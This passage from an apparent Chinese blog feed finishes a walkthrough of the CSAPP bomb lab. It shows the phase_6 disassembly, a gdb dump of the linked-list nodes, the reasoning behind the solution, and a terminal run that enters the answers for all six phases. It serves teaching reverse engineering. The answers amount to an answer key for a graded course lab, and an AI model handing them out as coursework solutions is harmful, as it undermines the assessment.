class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:    <span class="number">41</span> <span class="number">56</span>                    <span class="keyword">push</span>   %r14</span><br><span class="line">  4010f6:    <span class="number">41</span> <span class="number">55</span>                    <span class="keyword">push</span>   %r13</span><br><span class="line">  4010f8:    <span class="number">41</span> <span class="number">54</span>                    <span class="keyword">push</span>   %r12</span><br><span class="line">  4010fa:    <span class="number">55</span>                       <span class="keyword">push</span>   %rbp</span><br><span class="line">  4010fb:    <span class="number">53</span>                       <span class="keyword">push</span>   %rbx</span><br><span class="line">  4010fc:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">50</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x50,%rsp</span><br><span class="line">  <span class="number">401100</span>:    <span class="number">49</span> <span class="number">89</span> e5                 <span class="keyword">mov</span>    %rsp,%r13</span><br><span class="line">  <span class="number">401103</span>:    <span class="number">48</span> <span class="number">89</span> e6                 <span class="keyword">mov</span>    %rsp,%rsi</span><br><span class="line">  <span class="number">401106</span>:    e8 <span class="number">51</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>           callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  40110b:    <span class="number">49</span> <span class="number">89</span> e6                 <span class="keyword">mov</span>    %rsp,%r14</span><br><span class="line">  40110e:    <span class="number">41</span> bc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        <span class="keyword">mov</span>    <span class="number">$0</span>x0,%r12d</span><br><span class="line">  <span class="number">401114</span>:    4c <span class="number">89</span> ed                 <span class="keyword">mov</span>    %r13,%rbp</span><br><span class="line">  <span class="number">401117</span>:    <span class="number">41</span> 8b <span class="number">45</span> <span class="number">00</span>              <span class="keyword">mov</span>    <span class="number">0x0</span>(%r13),%eax</span><br><span class="line">  40111b:    <span class="number">83</span> e8 <span class="number">01</span>                 <span class="keyword">sub</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  40111e:    <span class="number">83</span> f8 <span class="number">05</span>                 <span class="keyword">cmp</span>    <span class="number">$0</span>x5,%eax</span><br><span class="line">  <span class="number">401121</span>:    <span class="number">76</span> <span class="number">05</span>                    <span class="keyword">jbe</span>    <span class="number">401128</span> &lt;phase_6+<span class="number">0x34</span>&gt;</span><br><span class="line">  <span class="number">401123</span>:    e8 <span class="number">12</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401128</span>:    <span class="number">41</span> <span class="number">83</span> c4 <span class="number">01</span>              <span class="keyword">add</span>    <span class="number">$0</span>x1,%r12d</span><br><span class="line">  40112c:    <span class="number">41</span> <span class="number">83</span> fc <span class="number">06</span>              <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%r12d</span><br><span class="line">  <span class="number">401130</span>:    <span class="number">74</span> <span class="number">21</span>                    <span class="keyword">je</span>     <span class="number">401153</span> &lt;phase_6+<span class="number">0x5f</span>&gt;</span><br><span class="line">  <span class="number">401132</span>:    <span class="number">44</span> <span class="number">89</span> e3                 <span class="keyword">mov</span>    %r12d,%ebx</span><br><span class="line">  <span class="number">401135</span>:    <span class="number">48</span> <span class="number">63</span> c3                 movslq %ebx,%rax</span><br><span class="line">  <span class="number">401138</span>:    8b <span class="number">04</span> <span class="number">84</span>                 <span class="keyword">mov</span>    (%rsp,%rax,<span class="number">4</span>),%eax</span><br><span class="line">  40113b:    <span class="number">39</span> <span class="number">45</span> <span class="number">00</span>                 <span class="keyword">cmp</span>    %eax,<span class="number">0x0</span>(%rbp)</span><br><span class="line">  40113e:    <span class="number">75</span> <span class="number">05</span>                    <span class="keyword">jne</span>    <span class="number">401145</span> &lt;phase_6+<span class="number">0x51</span>&gt;</span><br><span class="line">  <span class="number">401140</span>:    e8 f5 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401145</span>:    <span class="number">83</span> c3 <span class="number">01</span>                 <span class="keyword">add</span>    <span class="number">$0</span>x1,%ebx</span><br><span class="line">  <span class="number">401148</span>:    <span class="number">83</span> fb <span class="number">05</span>                 <span class="keyword">cmp</span>    <span class="number">$0</span>x5,%ebx</span><br><span class="line">  40114b:    7e e8                    <span class="keyword">jle</span>    <span class="number">401135</span> &lt;phase_6+<span class="number">0x41</span>&gt;</span><br><span class="line">  <span class="number">40114d</span>:    <span class="number">49</span> <span class="number">83</span> c5 <span class="number">04</span>              <span class="keyword">add</span>    <span class="number">$0</span>x4,%r13</span><br><span class="line">  <span class="number">401151</span>:    eb c1                    <span class="keyword">jmp</span>    <span class="number">401114</span> &lt;phase_6+<span class="number">0x20</span>&gt;</span><br><span class="line">  <span class="number">401153</span>:    <span class="number">48</span> <span class="number">8d</span> <span class="number">74</span> <span class="number">24</span> <span class="number">18</span>           <span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rsi</span><br><span class="line">  <span class="number">401158</span>:    4c <span class="number">89</span> f0                 <span class="keyword">mov</span>    %r14,%rax</span><br><span class="line">  40115b:    b9 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x7,%ecx</span><br><span class="line">  <span class="number">401160</span>:    <span class="number">89</span> ca                    <span class="keyword">mov</span>    %ecx,%edx</span><br><span class="line">  <span class="number">401162</span>:    2b <span class="number">10</span>                    <span class="keyword">sub</span>    (%rax),%edx</span><br><span class="line">  <span class="number">401164</span>:    <span class="number">89</span> <span class="number">10</span>                    <span class="keyword">mov</span>    %edx,(%rax)</span><br><span class="line">  <span class="number">401166</span>:    <span class="number">48</span> <span class="number">83</span> c0 <span class="number">04</span>              <span class="keyword">add</span>    <span class="number">$0</span>x4,%rax</span><br><span class="line">  40116a:    <span class="number">48</span> <span class="number">39</span> f0                 <span class="keyword">cmp</span>    %rsi,%rax</span><br><span class="line">  <span class="number">40116d</span>:    <span class="number">75</span> f1                    <span class="keyword">jne</span>    <span class="number">401160</span> &lt;phase_6+<span class="number">0x6c</span>&gt;</span><br><span class="line">  40116f:    be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</span><br><span class="line">  <span class="number">401174</span>:    eb <span class="number">21</span>                    <span class="keyword">jmp</span>    <span class="number">401197</span> &lt;phase_6+<span class="number">0xa3</span>&gt;</span><br><span class="line">  <span class="number">401176</span>:    <span class="number">48</span> 8b <span class="number">52</span> <span class="number">08</span>              <span class="keyword">mov</span>    <span class="number">0x8</span>(%rdx),%rdx</span><br><span class="line">  40117a:    <span class="number">83</span> c0 <span class="number">01</span>                 <span class="keyword">add</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  <span class="number">40117d</span>:    <span class="number">39</span> c8                    <span class="keyword">cmp</span>    %ecx,%eax</span><br><span class="line">  40117f:    <span class="number">75</span> f5                    <span class="keyword">jne</span>    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br><span class="line">  <span class="number">401181</span>:    eb <span class="number">05</span>                    <span class="keyword">jmp</span>    <span class="number">401188</span> &lt;phase_6+<span class="number">0x94</span>&gt;</span><br><span class="line">  <span class="number">401183</span>:    ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x6032d0,%edx</span><br><span class="line">  <span class="number">401188</span>:    <span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">74</span> <span class="number">20</span>           <span class="keyword">mov</span>    %rdx,<span class="number">0x20</span>(%rsp,%rsi,<span class="number">2</span>)</span><br><span class="line">  <span class="number">40118d</span>:    <span class="number">48</span> <span class="number">83</span> c6 <span class="number">04</span>              <span class="keyword">add</span>    <span class="number">$0</span>x4,%rsi</span><br><span class="line">  <span class="number">401191</span>:    <span class="number">48</span> <span class="number">83</span> fe <span class="number">18</span>              <span class="keyword">cmp</span>    <span class="number">$0</span>x18,%rsi</span><br><span class="line">  <span class="number">401195</span>:    <span class="number">74</span> <span class="number">14</span>                    <span class="keyword">je</span>     4011ab &lt;phase_6+<span class="number">0xb7</span>&gt;</span><br><span class="line">  <span class="number">401197</span>:    8b 0c <span class="number">34</span>                 <span class="keyword">mov</span>    (%rsp,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  40119a:    <span class="number">83</span> f9 <span class="number">01</span>                 <span class="keyword">cmp</span>    <span class="number">$0</span>x1,%ecx</span><br><span class="line">  <span class="number">40119d</span>:    7e e4                    <span class="keyword">jle</span>    <span class="number">401183</span> &lt;phase_6+<span class="number">0x8f</span>&gt;</span><br><span class="line">  40119f:    b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  4011a4:    ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x6032d0,%edx</span><br><span class="line">  4011a9:    eb cb                    <span class="keyword">jmp</span>    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br><span class="line">  4011ab:    <span class="number">48</span> 8b 5c <span class="number">24</span> <span class="number">20</span>           <span class="keyword">mov</span>    <span class="number">0x20</span>(%rsp),%rbx</span><br><span class="line">  4011b0:    <span class="number">48</span> <span class="number">8d</span> <span class="number">44</span> <span class="number">24</span> <span class="number">28</span>           <span class="keyword">lea</span>    <span class="number">0x28</span>(%rsp),%rax</span><br><span class="line">  4011b5:    <span class="number">48</span> <span class="number">8d</span> <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>           <span class="keyword">lea</span>    <span class="number">0x50</span>(%rsp),%rsi</span><br><span class="line">  4011ba:    <span class="number">48</span> <span class="number">89</span> d9                 <span class="keyword">mov</span>    %rbx,%rcx</span><br><span class="line">  4011bd:    <span class="number">48</span> 8b <span class="number">10</span>                 <span class="keyword">mov</span>    (%rax),%rdx</span><br><span class="line">  4011c0:    <span class="number">48</span> <span class="number">89</span> <span class="number">51</span> <span class="number">08</span>              <span class="keyword">mov</span>    %rdx,<span class="number">0x8</span>(%rcx)</span><br><span class="line">  4011c4:    <span class="number">48</span> <span class="number">83</span> c0 <span class="number">08</span>              <span class="keyword">add</span>    <span class="number">$0</span>x8,%rax</span><br><span class="line">  4011c8:    <span class="number">48</span> <span class="number">39</span> f0                 <span class="keyword">cmp</span>    %rsi,%rax</span><br><span class="line">  4011cb:    <span class="number">74</span> <span class="number">05</span>                    <span class="keyword">je</span>     4011d2 &lt;phase_6+<span class="number">0xde</span>&gt;</span><br><span class="line">  4011cd:    <span class="number">48</span> <span class="number">89</span> d1                 <span class="keyword">mov</span>    %rdx,%rcx</span><br><span class="line">  4011d0:    eb eb                    <span class="keyword">jmp</span>    4011bd &lt;phase_6+<span class="number">0xc9</span>&gt;</span><br><span class="line">  4011d2:    <span class="number">48</span> c7 <span class="number">42</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     <span class="keyword">movq</span>   <span class="number">$0</span>x0,<span class="number">0x8</span>(%rdx)</span><br><span class="line">  4011d9:    <span class="number">00</span> </span><br><span class="line">  4011da:    bd <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x5,%ebp</span><br><span class="line">  4011df:    <span class="number">48</span> 8b <span class="number">43</span> <span class="number">08</span>              <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rax</span><br><span class="line">  4011e3:    8b <span class="number">00</span>                    <span class="keyword">mov</span>    (%rax),%eax</span><br><span class="line">  4011e5:    <span class="number">39</span> <span class="number">03</span>                    <span class="keyword">cmp</span>    %eax,(%rbx)</span><br><span class="line">  4011e7:    <span class="number">7d</span> <span class="number">05</span>                    <span class="keyword">jge</span>    4011ee &lt;phase_6+<span class="number">0xfa</span>&gt;</span><br><span class="line">  4011e9:    e8 4c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:    <span class="number">48</span> 8b 5b <span class="number">08</span>              <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rbx</span><br><span class="line">  4011f2:    <span class="number">83</span> ed <span class="number">01</span>                 <span class="keyword">sub</span>    <span class="number">$0</span>x1,%ebp</span><br><span class="line">  4011f5:    <span class="number">75</span> e8                    <span class="keyword">jne</span>    4011df &lt;phase_6+<span class="number">0xeb</span>&gt;</span><br><span class="line">  4011f7:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">50</span>              <span class="keyword">add</span>    <span class="number">$0</span>x50,%rsp</span><br><span class="line">  4011fb:    5b                       <span class="keyword">pop</span>    %rbx</span><br><span class="line">  4011fc:    <span class="number">5d</span>                       <span class="keyword">pop</span>    %rbp</span><br><span class="line">  4011fd:    <span class="number">41</span> 5c                    <span class="keyword">pop</span>    %r12</span><br><span class="line">  4011ff:    <span class="number">41</span> <span class="number">5d</span>                    <span class="keyword">pop</span>    %r13</span><br><span class="line">  <span class="number">401201</span>:    <span class="number">41</span> 5e                    <span class="keyword">pop</span>    %r14</span><br><span class="line">  <span class="number">401203</span>:    c3                       retq</span><br></pre></td></tr></table></figure><p>或许看到如此冗长的汇编代码你会感到茫然，其实没有什么难度，多点耐心就好。</p><p>主要表达的是：</p><ul><li>共有六个数字，每个数字 &lt;= 6</li><li>每个数字执行固定操作 取反 + 7</li><li>用操作后的数字作为取址次数，0x6032d0作为基地址，按顺序将对应内存位置 + 8 的内容存储到堆栈。</li><li>按顺序，堆栈处所存储地址对应的数字应该是递减的</li></ul><p>查看 0x6032d0 内存内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/100x 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:    0x0000014c    0x00000001    0x006032e0    0x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:    0x000000a8    0x00000002    0x006032f0    0x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:    0x0000039c    0x00000003    0x00603300    0x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:    0x000002b3    0x00000004    0x00603310    0x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:    0x000001dd    0x00000005    0x00603320    0x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:    0x000001bb    0x00000006    0x00000000    0x00000000</span><br></pre></td></tr></table></figure><p>对应内存地址内容从小到大排列应该是 0x6032f0 0x603300 0x603310 0x603320 0x6032d0 0x6032e0<br>循环次数应该是 2 3 4 5 0 1,注意到 main 函数第57行:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">40119f:    b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br></pre></td></tr></table></figure><p>比较时 eax 初始值为1,每操作一次，然后比较。所以，实际的值应该为 3 4 5 6 1 2,又因为一开始对数字进行取反加7的操作，所以本来的6个数字应该是 4 3 2 1 6 5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">7 327</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string">7 0</span></span><br><span class="line"><span class="string">So you got that one.  Try this one.</span></span><br><span class="line"><span class="string">9?&gt;567</span></span><br><span class="line"><span class="string">Good work!  On to the next...</span></span><br><span class="line"><span class="string">4 3 2 1 6 5</span></span><br><span class="line"><span class="string">Congratulations! You&#x27;</span>ve defused the bomb!</span><br></pre></td></tr></table></figure><p>全文完</p><p>任何建议或者疑问你可以发我邮件: <a href="mailto:&#x61;&#x72;&#100;&#x78;&#x77;&#101;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;">&#x61;&#x72;&#100;&#x78;&#x77;&#101;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于课程&quot;&gt;&lt;a href=&quot;#关于课程&quot; class=&quot;headerlink&quot; title=&quot;关于课程&quot;&gt;&lt;/a&gt;关于课程&lt;/h2&gt;&lt;p&gt;这门课程围绕 &lt;a href=&quot;https://book.douban.com/subject/26912767/&quot;&gt;CSA
      
    
    </summary>
    
    
    
      <category term="CSAPP" scheme="http://yoursite.com/tags/CSAPP/"/>
    
  </entry>
  
</feed>
